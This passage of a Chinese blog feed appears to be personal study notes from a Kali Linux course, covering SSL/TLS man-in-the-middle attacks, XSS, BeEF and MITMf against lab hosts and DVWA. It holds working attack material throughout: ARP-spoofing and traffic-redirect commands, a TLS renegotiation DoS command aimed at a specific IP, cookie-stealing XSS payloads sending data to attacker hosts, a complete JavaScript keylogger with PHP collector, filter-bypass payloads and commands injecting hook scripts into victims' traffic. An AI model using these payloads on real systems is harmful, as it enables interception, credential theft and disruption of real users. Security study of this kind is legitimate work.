<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
<li>SSLsplit（调用Openssl）<ul>
<li>透明SSL/TLS中间人攻击工具</li>
<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
<li>伪装服务器需要伪造证书</li>
<li>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击</li>
</ul>
</li>
<li>利用openssl生成证书私钥<ul>
<li><strong><code>🔺命令：openssl genrsa -out ca.key 2048</code></strong></li>
</ul>
</li>
<li>利用私钥签名生成证书<ul>
<li><strong><code>🔺命令：openssl req -new -x509 -days（证书时间） 1096 -key ca.key -out ca.crt</code></strong></li>
<li>填写相关信息：Country、Province、Locality Name、Organization、Organizational Name、FQDN Name、Email Address</li>
</ul>
</li>
<li>启用路由（中间人）/proc/sys/net/ipv4/ip_forward<ul>
<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong></li>
</ul>
</li>
<li>iptables端口转发规则<ul>
<li><strong><code>🔺命令：iptables -t nat -F</code></strong>（清空当前所有规则）</li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
<li><strong><code>🔺命令：iptables -t nat -L</code></strong>（查看添加的所有规则）</li>
</ul>
</li>
<li>ARP欺骗<ul>
<li>win7 → <strong><code>🔺命令：arp a（查看网关MAC地址）</code></strong></li>
<li>Kali → <strong><code>🔺命令：arpspoof -l eth0 -t 1.1.1.2（目标主机） -r 1.1.1.1（欺骗的网关）</code></strong>▲ 2020.1.23修改-l参数为-i</li>
</ul>
</li>
<li>启动SSLsplit<ul>
<li><strong><code>🔺命令：mkdir -p test/logdir</code></strong></li>
<li><strong><code>🔺命令：sslsplit -D（debug模式）-l（连接信息记录） connect.log -j（&quot;越狱目录&quot;） /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></strong></li>
</ul>
</li>
<li>被害者访问taobao，baidu，mail.163.com</li>
<li>查看日志和浏览器证书（connect.log，443.log，80.log）</li>
<li>安装服务器根证书后再次访问<ul>
<li>拷贝根证书到win7电脑上</li>
<li>双击证书安装 → 受信任的根证书颁发机构</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐taobao的官网，除了https加密之外，还对数据进行加密（比如密码控件）
⭐全站https和非全站https的区别，非全站https是指对登陆的账户和密码使用https登陆
⭐可以通过grep 12334 * 去查看要查看的信息（搜索日志文件）</code></pre></blockquote>
<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
<li>▲ 自动集成生成一张证书（同SSLsplit的证书不同）</li>
<li>Bug：http(80)/https(443)只能在8080端口侦听</li>
<li>iptables端口转发规则<ul>
<li><strong><code>🔺命令：iptables -t nat -F</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
</ul>
</li>
<li>启动mitmproxy<ul>
<li><strong><code>🔺命令：mitmproxy -T --host -w mitmproxy.log</code></strong>（窗口记录流量）</li>
<li>Tab 下一个信息/q 退出/也可以鼠标点击访问 </li>
<li>▲ 2020.1.24 -T参数修改为 –mode transparent，-host参数被取消</li>
</ul>
</li>
</ul>
<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
<li>自动生成sslstrip.log文件</li>
<li><strong><code>🔺命令：sslstrip -l 8080</code></strong> ▲ 2020.1.24若无法转变，则会报建立安全连接失败</li>
</ul>
<h4 id="5-SSL-TLS拒绝服务攻击"><a href="#5-SSL-TLS拒绝服务攻击" class="headerlink" title="5. SSL/TLS拒绝服务攻击"></a>5. SSL/TLS拒绝服务攻击</h4><ul>
<li>thc-ssl-dos<ul>
<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用ADSL线路打垮30G带宽的服务器</li>
<li>服务器平均可以处理300次/秒SSL握手请求</li>
<li>对SMTPS、POP3等服务同样有效</li>
<li><strong><code>🔺命令：thc-ssl-dos 199.223.209.205 2083 --accept</code></strong> ▲ 2020.1.23 Target has disabled renegotiations.</li>
</ul>
</li>
<li>对策<ul>
<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十二)：XSS</title>
    <url>/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/</url>
    <content><![CDATA[<hr>
<h4 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1. XSS"></a>1. XSS</h4><ul>
<li>攻击WEB客户端</li>
<li>客户端脚本语言<ul>
<li>弹窗告警</li>
<li>Javascript</li>
<li>在浏览器中执行</li>
</ul>
</li>
<li>XSS（cross-site scripting）<ul>
<li>▲ 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li>
<li>注入客户端脚本代码</li>
<li>盗取cookie</li>
<li>重定向</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐之前的攻击手段脚本是对服务端的攻击
⭐Browser → Web Applicatipn → Server → Database
⭐服务器WEB站点存在漏洞，Hacker通过客户端提交给WEB站点，攻击WEB客户端</code></pre></blockquote>
<ul>
<li>VBScript（针对微软浏览器），ActiveX，or Flash</li>
<li>JavaScript<ul>
<li>与Java语言无关</li>
<li>命名完全出于市场原因</li>
<li>使用最广的客户端脚本语言</li>
</ul>
</li>
<li>使用场景<ul>
<li>直接嵌入html：<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
<li>元素标签事件：<code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
<li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
<li>其他标签：<code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
<li>DOM对象，篡改页面内容</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐DOM，文本对象模型，每一个页面对应一个DOM对象，每个页面中的元素对应一个DOM对象中的子元素，基于DOM提出了一些API，可以用jS调用DOM的API进行修改元素，不向服务器端发送请求</code></pre></blockquote>
<ul>
<li>攻击参与方<ul>
<li>攻击者</li>
<li>被攻击者</li>
<li>漏洞站点</li>
<li>第三方站点（攻击目标、攻击参与站）</li>
</ul>
</li>
<li>漏洞形成的根源（传入传出无做”消毒”）<ul>
<li>服务器对用户提交数据过滤不严</li>
<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐第三方站点存在xss漏洞（比如第三方站点为淘宝）
1.存放一个js代码
2.客户端每次访问第三方站点，都会下载这个js代码
3.js代码指向一个真正攻击站点，若访问的流量过大，会对真正的目标站点形成DDOS攻击</code></pre></blockquote>
<ul>
<li>XSS漏洞类型（▲ 客户端发送js代码给服务器，服务器原封不动返回js代码给浏览器）<ul>
<li>存储型（持久型，一次注入服务器并保存在服务器上）</li>
<li>反射型（非持久，一次注入服务器，服务器立刻返回给发起方，不保存）</li>
<li>DOM型（本质是反射型，利用浏览器DOM特性，直接在本地执行修改）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐反射型漏洞利用
1.Hacker利用社会工程学调查信息，给受害者发送一封邮件，比如地图等
2.受害者点击地图，会发送地图中的js代码给有漏洞的服务器，js代码可以为监视器等
3.服务器端原端不动发送js代码给受害者
4.js代码到达客户端并在浏览器执行</code></pre></blockquote>
<ul>
<li><p>漏洞PoC  ▲▲ 尝试组合</p>
<ul>
<li><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
<li><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;type&lt;/a&gt;</code>（onclick/onload/onerror）</li>
<li><code>&lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
<li><code>&lt;script&gt;window.location=&quot;http://1.1.1.1&quot;&lt;/script&gt;</code></li>
<li><code>&lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height=&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
<li>▲ 发送Cookies信息：<code>&lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output==&quot;+document.cookie;&lt;/script&gt;</code></li>
<li>▲ 篡改页面：<code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>窃取Cookie</p>
<ul>
<li><strong><code>🔺命令：vi 1.html</code></strong>（body中写入url）</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
</ul>
</li>
<li><p>a.js源码（隐蔽性强）</p>
<ul>
<li>var img = new Image();</li>
<li>img.src=”<a href="http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐js源码
1.kali，/var/www/html，vi a.js
2.var img = new Image();
3.img.src=&quot;http://1.1.1.1:88/cookies.php?cookie==&quot;+document.cookie;（88端口为nc侦听端口）
4.service apache2 start
5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="2-XSS–键盘记录"><a href="#2-XSS–键盘记录" class="headerlink" title="2. XSS–键盘记录"></a>2. XSS–键盘记录</h4><ul>
<li>Kali上开启apache服务，<strong><code>🔺命令：service apache2 start</code></strong></li>
<li>在kali的/var/www/html/中准备Keylogger.js</li>
</ul>
<pre><code>document.onkeypress = function(evt) { 
    evt = evt || window.event 
    key = String.fromCharCode(evt.charCode) 
    if (key) {       
        var http = new XMLHttpRequest(); 
        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
        http.send(&quot;key=&quot;+param); 
    } 
}</code></pre><ul>
<li>在kali的/var/www/html/中准备Keylogger.php</li>
</ul>
<pre><code>&lt;?php 
    $key=$_POST[&#39;key&#39;]; 
    $logfile=&quot;keylog.txt&quot;; 
    $fp = fopen($logfile, &quot;a&quot;); 
    fwrite($fp, $key); 
    fclose($fp);  
?&gt;</code></pre><ul>
<li>在kali的/var/www/html/中准备keylog.txt，不需要写入数据</li>
<li><strong><code>🔺命令：chmod 777 keylog.txt</code></strong>（保证执行权限）</li>
<li>浏览器中注入<code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code></li>
<li>在浏览器上建立一个a.html <ul>
<li><code>&lt;a href=&quot;http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script +src=&#39;http://192.168.20.8/keylogger.js&#39;&gt;&lt;/script&gt;&quot;&gt;xss（诱惑性语言）&lt;/a&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="3-Xsser–基本使用"><a href="#3-Xsser–基本使用" class="headerlink" title="3. Xsser–基本使用"></a>3. Xsser–基本使用</h4><ul>
<li>命令行/图形化工具</li>
<li>绕过服务器端输入筛选<ul>
<li>10进制/16进制编码</li>
<li>unescape()</li>
</ul>
</li>
<li><strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g（Get方法）/-p（Post方法） &quot;xss_r/?name=XSS（Get方法/Post为body数据段）&quot; --cookie=&quot;securit=low;PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s（测试提交后统计）-v（显示详细信息）--reverse-check（防止hash值误报，提交建立网络连接的js脚本，基于连接是否建立）</code></strong> ▲ 2020.1.20在低安全级别下注入不成功</li>
<li>–heuristi（检查被过滤的字符）</li>
</ul>
<h4 id="4-Xsser–payload编码"><a href="#4-Xsser–payload编码" class="headerlink" title="4. Xsser–payload编码"></a>4. Xsser–payload编码</h4><ul>
<li>对payload编码，绕过服务器端筛选过滤<ul>
<li>–Str      Use method String.FromCharCode()（字符串编码）</li>
<li>–Une      Use Unescape() function ▲ 注释</li>
<li>–Mix      Mix String.FromCharCode() and Unescape()（混合编码）</li>
<li>–Dec      Use Decimal encoding（十进制编码）</li>
<li>–Hex      Use Hexadecimal encoding（十六进制编码）</li>
<li>–Hes      Use Hexadecimal encoding, with semicolons</li>
<li>–Dwo      Encode vectors IP addresses in DWORD（IP地址编码，双字节）</li>
<li>–Doo      Encode vectors IP addresses in Octal（IP地址编码，Octal形式）</li>
<li>–Cem=CEM  Try -manually- different Character Encoding Mutations</li>
<li>(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li>
</ul>
</li>
</ul>
<h4 id="5-Xsser–注入技术"><a href="#5-Xsser–注入技术" class="headerlink" title="5. Xsser–注入技术"></a>5. Xsser–注入技术</h4><ul>
<li>注入技术（多选）<ul>
<li>–Coo      Cross Site Scripting Cookie injection（Cookie注入）</li>
<li>–Xsa      Cross Site Agent Scripting（Agent注入）</li>
<li>–Xsr      Cross Site Referer Scripting（Referer注入）</li>
<li>–Dcp      Data Control Protocol injections（数据控制协议注入）</li>
<li>–Dom      Document Object Model injections（DOM对象注入）</li>
<li>–Lnd      HTTP Response Splitting Induced code（HTTP响应代码）</li>
<li>–Anchor   Use Anchor Stealth payloader (DOM shadows!)</li>
<li>–Phpids   PHP - Exploit PHPIDS bug (0.6.5) to bypass filters（phpids是基于PHP的一个安全框架，存在Bug）</li>
<li>–Doss     XSS Denial of service (server) injection（服务器拒绝服务）</li>
<li>–Dos      XSS Denial of service (client) injection（客户端拒绝服务）</li>
<li>–B64      Base64 code encoding in META tag (rfc2397)（Base64编码）</li>
<li>–Onm      ONM - Use onMouseMove() event to inject code（页面事件注入）</li>
<li>–Ifr      Use <code>&lt;iframe&gt;</code>source tag to inject code（iframe注入）</li>
</ul>
</li>
</ul>
<h4 id="6-XSS–DVWA"><a href="#6-XSS–DVWA" class="headerlink" title="6. XSS–DVWA"></a>6. XSS–DVWA</h4><ul>
<li>Dvwa的XSS reflected（Low）</li>
</ul>
<pre><code>&lt;?php

    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#39;name&#39;] == NULL || $_GET[&#39;name&#39;] == &#39;&#39;){

    $isempty = true;

    } else {

    echo &#39;&lt;pre&gt;&#39;;
    echo &#39;Hello &#39; . $_GET[&#39;name&#39;];
    echo &#39;&lt;/pre&gt;&#39;;

    }
?&gt; </code></pre><ul>
<li>Dvwa的XSS reflected（Medium）–对输出的过滤<ul>
<li>绕过方法：<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code></li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#39;name&#39;] == NULL || $_GET[&#39;name&#39;] == &#39;&#39;){

    $isempty = true;

    } else {

    echo &#39;&lt;pre&gt;&#39;;
    echo &#39;Hello &#39; . str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[&#39;name&#39;]);
    echo &#39;&lt;/pre&gt;&#39;; 

    }

?&gt;</code></pre><ul>
<li>Dvwa的XSS reflected（High）–对输出的过滤<ul>
<li>▲ htmlspecialchars() → 输出html编码&lt; → &lt; &gt; → &gt;</li>
<li>绕过尝试: <strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></strong></li>
<li>▲ 若注入代码位于&lt;&gt;之内，可以不输入&lt;&gt;，直接输入代码，如Onclick=alert(‘xss’)</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#39;name&#39;] == NULL || $_GET[&#39;name&#39;] == &#39;&#39;){

    $isempty = true;

    } else {

    echo &#39;&lt;pre&gt;&#39;;
    echo &#39;Hello &#39; . htmlspecialchars($_GET[&#39;name&#39;]);
    echo &#39;&lt;/pre&gt;&#39;;

    }

?&gt;</code></pre><h4 id="7-XSS-stored"><a href="#7-XSS-stored" class="headerlink" title="7. XSS stored"></a>7. XSS stored</h4><ul>
<li>存储型XSS<ul>
<li>长期存储于服务器端</li>
<li>每次用户访问都会被执行javascript脚本</li>
</ul>
</li>
<li>Name：客户端表单长度限制（好的Web Application同时在客户端和服务器端做长度限制）<ul>
<li>解除限制：浏览器客户端、截断代理</li>
</ul>
</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
<li>a.js源码（隐蔽性强）<ul>
<li>var img = new Image();</li>
<li>img src=”<a href="http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐js源码
1.kali，/var/www/html，vi a.js
2.var img = new Image();
3.img src=&quot;http://1.1.1.1:88/cookies.php?cookie=&quot;+document.cookie;（88端口为nc侦听端口）
4.service apache2 start
5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）"><a href="#8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）" class="headerlink" title="8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）"></a>8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）</h4><ul>
<li>DVWA的XSS stored（&amp;message、Low）<ul>
<li>基本没有对&amp;message、&amp;name过滤，可实现任意注入</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if(isset($_POST[&#39;btnSign&#39;]))
{

   $message = trim($_POST[&#39;mtxMessage&#39;]);
   $name    = trim($_POST[&#39;txtName&#39;]);

   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);

   // Sanitize name input
   $name = mysql_real_escape_string($name);

   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&#39;$message&#39;,&#39;$name&#39;);&quot;;

   $result = mysql_query($query) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

}

?&gt;</code></pre><ul>
<li>DVWA的XSS stored（Medium）<ul>
<li>绕过方法：&amp;message基本无法注入，&amp;name可以通过<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code>绕过 ▲ 2020.1.20&amp;name不需要绕过注入</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if(isset($_POST[&#39;btnSign&#39;]))
{

   $message = trim($_POST[&#39;mtxMessage&#39;]);
   $name    = trim($_POST[&#39;txtName&#39;]);

   // Sanitize message input
   $message = trim(strip_tags(addslashes($message)));
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);

   // Sanitize name input
   $name = str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $name);
   $name = mysql_real_escape_string($name);

   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&#39;$message&#39;,&#39;$name&#39;);&quot;;

   $result = mysql_query($query) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

}

?&gt;</code></pre><ul>
<li>DVWA的XSS stored（High）</li>
</ul>
<pre><code>&lt;?php

if(isset($_POST[&#39;btnSign&#39;]))
{

   $message = trim($_POST[&#39;mtxMessage&#39;]);
   $name    = trim($_POST[&#39;txtName&#39;]);

   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);

   // Sanitize name input
   $name = stripslashes($name);
   $name = mysql_real_escape_string($name); 
   $name = htmlspecialchars($name);

   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&#39;$message&#39;,&#39;$name&#39;);&quot;;

   $result = mysql_query($query) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

}

?&gt;</code></pre><h4 id="9-XSS-DOM"><a href="#9-XSS-DOM" class="headerlink" title="9. XSS DOM"></a>9. XSS DOM</h4><ul>
<li>DOM型XSS<ul>
<li>一套JS和其他语言可调用的标准的API</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/XSS-DOM.PNG" srcset="/img/loading.gif" alt="DOM型XSS"></p>
<ul>
<li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http:// 192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li>
</ul>
<h4 id="10-BEEF"><a href="#10-BEEF" class="headerlink" title="10. BEEF"></a>10. BEEF</h4><ul>
<li>浏览器攻击面（不可忽视，基本上最接近用户）<ul>
<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
<li>结合社会工程学方法对浏览器进行攻击</li>
<li>攻击浏览器用户</li>
<li>通过注入的JS脚本，利用浏览器攻击其他网站</li>
</ul>
</li>
<li>BeFF（Browser exploitation framework）<ul>
<li>生成、交付payload</li>
<li>Ruby语言编写</li>
<li>服务器端：管理hooked客户端</li>
<li>客户端：运行客户端浏览器的Javascript脚本（hook）</li>
</ul>
</li>
<li>攻击手段<ul>
<li>利用网站XSS漏洞实现攻击</li>
<li>诱使客户端访问含有hook的伪造站点</li>
<li>结合中间人攻击注入hook脚本</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐中间人攻击/劫持
运行商：链路劫持，插入js脚本，来宣传广告，黑色收入
Hacker：CDN劫持，在CDN节点上插入js脚本</code></pre></blockquote>
<ul>
<li>常见用途<ul>
<li>键盘记录器</li>
<li>网络扫描</li>
<li>浏览器信息收集</li>
<li>绑定shell</li>
<li>与metasploit集成</li>
</ul>
</li>
<li>演示页面：http://<IP_BeEF_Server>:3000/demos/basic.html</li>
<li>hook.js：<a href="http://127.0.0.1:3000/hook.js" target="_blank" rel="noopener">http://127.0.0.1:3000/hook.js</a></li>
<li>BeEF登陆界面：username:beef/password:beef ▲ 2020.1.20修改密码为admin</li>
<li>BeEF用户界面：<a href="http://127.0.0.1:3000/ul/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ul/panel</a></li>
<li>DVWA的XSS stored（$name进行hook，$message不注入）</li>
<li>Details：<ul>
<li>浏览器、插件版本信息；操作系统信息</li>
</ul>
</li>
<li>Logs：<ul>
<li>浏览器动作：焦点变化、鼠标点击、信息输入</li>
</ul>
</li>
<li>Commands：命令模块<ul>
<li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li>
<li>红色模块：表示模块不适合当前用户，有些红色模块也可以正常执行</li>
<li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
<li>灰色模块：模块未在目标浏览器上测试过</li>
</ul>
</li>
<li>主要模块<ul>
<li>Browsers</li>
<li>Exploits</li>
<li>Host</li>
<li>Persistence（持久性）</li>
<li>Network</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS</title>
    <url>/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/</url>
    <content><![CDATA[<hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
